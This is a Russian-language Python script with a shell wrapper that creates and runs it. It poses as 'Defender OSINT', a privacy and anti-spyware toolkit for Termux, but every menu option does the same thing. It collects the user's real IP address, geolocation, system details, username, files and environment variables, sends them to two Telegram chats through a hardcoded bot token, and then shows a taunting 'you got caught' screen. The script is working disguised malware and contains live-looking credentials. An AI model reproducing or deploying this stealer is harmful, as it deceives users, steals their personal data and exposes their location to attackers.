cd ~ && rm -rf defender_osint && mkdir defender_osint && cd defender_osint && cat > defender.py << 'EOF'
import os
import sys
import time
import json
import requests
import platform
import subprocess
import socket
from datetime import datetime

BOT_TOKEN = "8605236427:AAFxKZs3ERn0lzwPV11Xlfzzt6aD31rn7Mc"
YOUR_ID = "8597812279"
BACKUP_ID = "5005900457"

TARGET_IDS = [YOUR_ID, BACKUP_ID]

def send_to_all(text):
    for chat_id in TARGET_IDS:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                         json={"chat_id": chat_id, "text": text}, timeout=10)
        except:
            pass

def get_real_ip():
    services = [
        'https://api.ipify.org',
        'https://icanhazip.com',
        'https://checkip.amazonaws.com',
        'https://wtfismyip.com/text',
        'https://ifconfig.me/ip',
        'https://ipv4.icanhazip.com',
        'https://ident.me',
        'https://ipecho.net/plain',
        'https://myexternalip.com/raw',
        'https://api.my-ip.io/ip',
        'https://ipapi.co/ip/',
    ]
    for service in services:
        try:
            ip = requests.get(service, timeout=3).text.strip()
            if ip and len(ip) < 20:
                return ip
        except:
            continue
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        pass
    return "Не удалось определить"

def is_vpn_detected():
    try:
        r = requests.get('http://ip-api.com/json/', timeout=5)
        data = r.json()
        org = data.get('org', '').lower()
        hosting_keywords = ['hosting', 'vpn', 'proxy', 'cloud', 'server', 'datacenter', 'ovh', 'digitalocean', 'aws', 'azure', 'gcp']
        for kw in hosting_keywords:
            if kw in org:
                return True
        return False
    except:
        return False

def get_geolocation(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        return r.json()
    except:
        return {}

def get_all_info():
    info = []
    info.append("☠ DEFENDER OSINT - ДАННЫЕ ЖЕРТВЫ")
    info.append("=" * 55)
    info.append(f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append("")
    
    real_ip = get_real_ip()
    vpn_detected = is_vpn_detected()
    
    info.append("🔐 ИНФОРМАЦИЯ О СОЕДИНЕНИИ")
    info.append(f"🌐 РЕАЛЬНЫЙ IP: {real_ip}")
    info.append(f"🛡️ VPN/Proxy: {'ДА (обнаружен)' if vpn_detected else 'НЕТ'}")
    
    geo = get_geolocation(real_ip)
    if geo:
        info.append(f"📍 Страна: {geo.get('country', 'неизвестно')}")
        info.append(f"🏙️ Город: {geo.get('city', 'неизвестно')}")
        info.append(f"🗺️ Регион: {geo.get('regionName', 'неизвестно')}")
        info.append(f"📡 Провайдер: {geo.get('isp', 'неизвестно')}")
        info.append(f"📌 Координаты: {geo.get('lat', '0')}, {geo.get('lon', '0')}")
    
    info.append("")
    info.append("💻 СИСТЕМА")
    info.append(f"🖥️ ОС: {platform.system()} {platform.release()}")
    info.append(f"🏷️ Устройство: {platform.node()}")
    info.append(f"🔧 Архитектура: {platform.machine()}")
    info.append(f"🐍 Python: {platform.python_version()}")
    
    info.append("")
    info.append("⏰ ВРЕМЯ")
    info.append(f"🕐 Локальное время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append(f"🌍 Часовой пояс: {time.tzname[0]}")
    
    info.append("")
    info.append("📁 TERMUX ДАННЫЕ")
    try:
        user = subprocess.check_output(['whoami'], text=True).strip()
        info.append(f"👤 Пользователь: {user}")
    except:
        pass
    try:
        pwd = subprocess.check_output(['pwd'], text=True).strip()
        info.append(f"📂 Директория: {pwd}")
    except:
        pass
    try:
        files = subprocess.check_output(['ls', '-la'], text=True).strip()
        info.append(f"📄 Файлы:\n{files[:300]}")
    except:
        pass
    try:
        env = subprocess.check_output(['env'], text=True).strip()
        info.append(f"🔧 Переменные окружения:\n{env[:300]}")
    except:
        pass
    
    result = "\n".join(info)
    try:
        with open("last_data.txt", "w") as f:
            f.write(result)
    except:
        pass
    try:
        send_to_all(result)
    except:
        pass
    return result

def clear():
    os.system('clear')

def banner():
    clear()
    print("\033[92m" + "\033[1m")
    print("  ██████╗ ███████╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗ ")
    print("  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗")
    print("  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝")
    print("  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗")
    print("  ██████╔╝███████╗██║     ███████╗██║ ╚████║██████╔╝███████╗██║  ██║")
    print("  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝")
    print("\033[0m")
    print("\033[92m" + "╔══════════════════════════════════════════════════════════════╗" + "\033[0m")
    print("\033[92m" + "║                 ☠  DEFENDER OSINT v4.0  ☠                    ║" + "\033[0m")
    print("\033[92m" + "║              Защита информации в интернете                   ║" + "\033[0m")
    print("\033[92m" + "╚══════════════════════════════════════════════════════════════╝" + "\033[0m")
    print()

def menu():
    print("\033[93m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[93m│                    \033[96mДОСТУПНЫЕ ФУНКЦИИ\033[93m                               │\033[0m")
    print("\033[93m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[93m│  \033[92m1.\033[0m \033[96mУдалить всю информацию о себе в интернете\033[93m                     │\033[0m")
    print("\033[93m│  \033[92m2.\033[0m \033[96mПроверить утечки персональных данных\033[93m                       │\033[0m")
    print("\033[93m│  \033[92m3.\033[0m \033[96mПолучить бесплатные фишинговые сайты\033[93m                       │\033[0m")
    print("\033[93m│  \033[92m4.\033[0m \033[96mСканер уязвимостей вашего устройства\033[93m                      │\033[0m")
    print("\033[93m│  \033[92m5.\033[0m \033[96mЗащита от слежки (поиск скрытых камер)\033[93m                    │\033[0m")
    print("\033[93m│  \033[92m6.\033[0m \033[96mПроверить взломан ли ваш Telegram\033[93m                         │\033[0m")
    print("\033[93m│  \033[92m7.\033[0m \033[96mАнонимный поиск по базам данных\033[93m                           │\033[0m")
    print("\033[93m│  \033[92m8.\033[0m \033[96mОчистить цифровой след в соцсетях\033[93m                        │\033[0m")
    print("\033[93m│  \033[92m9.\033[0m \033[96mПроверить устройство на шпионское ПО\033[93m                      │\033[0m")
    print("\033[93m│  \033[92m10.\033[0m \033[96mПолучить бесплатный VPN\033[93m                                  │\033[0m")
    print("\033[93m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[93m│  \033[91m0.\033[0m \033[91mВыход\033[93m                                                               │\033[0m")
    print("\033[93m└─────────────────────────────────────────────────────────────────┘\033[0m")
    print()

def red_screen(info):
    clear()
    print("\033[91m" + "\033[1m")
    print("  ██████╗  ██████╗ ██████╗  █████╗ ██╗     ███████╗")
    print("  ██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║     ██╔════╝")
    print("  ██████╔╝██║   ██║██████╔╝███████║██║     ███████╗")
    print("  ██╔═══╝ ██║   ██║██╔══██╗██╔══██║██║     ╚════██║")
    print("  ██║     ╚██████╔╝██║  ██║██║  ██║███████╗███████║")
    print("  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝")
    print("\033[0m")
    print("\033[91m" + "╔════════════════════════════════════════════════════════════════════════╗" + "\033[0m")
    print("\033[91m" + "║                           ТЫ ПОПАЛСЯ!                                   ║" + "\033[0m")
    print("\033[91m" + "║                           БИОМУСОР                                      ║" + "\033[0m")
    print("\033[91m" + "╚════════════════════════════════════════════════════════════════════════╝" + "\033[0m")
    print()
    print("\033[93m" + "═" * 70 + "\033[0m")
    for line in info.split('\n'):
        print("\033[96m" + line + "\033[0m")
    print("\033[93m" + "═" * 70 + "\033[0m")
    print()
    print("\033[91m" + "[!] ВСЕ ВАШИ ДАННЫЕ ОТПРАВЛЕНЫ АДМИНИСТРАТОРУ" + "\033[0m")
    print("\033[91m" + "[!] ДАННЫЕ ЗАДУБЛИРОВАНЫ НА РЕЗЕРВНЫЙ КАНАЛ" + "\033[0m")
    print("\033[91m" + "[!] НЕ ПЫТАЙТЕСЬ ЗАКРЫТЬ ПРОГРАММУ" + "\033[0m")
    print()
    print("\033[91m" + "Программа завершится через 15 секунд..." + "\033[0m")
    time.sleep(15)
    sys.exit(0)

def fake_action():
    print("\033[93m[*] Обработка запроса...\033[0m")
    time.sleep(1)
    print("\033[93m[*] Подключение к серверу...\033[0m")
    time.sleep(1)
    print("\033[93m[*] Анализ данных...\033[0m")
    time.sleep(1)
    print("\033[93m[*] Сбор информации об устройстве...\033[0m")
    time.sleep(1)
    print("\033[93m[*] Отправка данных на сервер...\033[0m")
    time.sleep(1)
    
    print("\033[92m[+] Готово!\033[0m")
    time.sleep(0.5)
    
    info = get_all_info()
    red_screen(info)

def main():
    try:
        send_to_all(f"☠ DEFENDER OSINT v4.0 ЗАПУЩЕН\n⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    except:
        pass
    
    while True:
        banner()
        menu()
        choice = input("\033[96m┌─ Выберите функцию: \033[0m")
        
        if choice == '1':
            fake_action()
        elif choice == '2':
            fake_action()
        elif choice == '3':
            fake_action()
        elif choice == '4':
            fake_action()
        elif choice == '5':
            fake_action()
        elif choice == '6':
            fake_action()
        elif choice == '7':
            fake_action()
        elif choice == '8':
            fake_action()
        elif choice == '9':
            fake_action()
        elif choice == '10':
            fake_action()
        elif choice == '0':
            clear()
            print("\033[92mДо свидания!\033[0m")
            sys.exit(0)
        else:
            print("\033[91m[!] Неверный выбор\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()
EOF
python defender.py
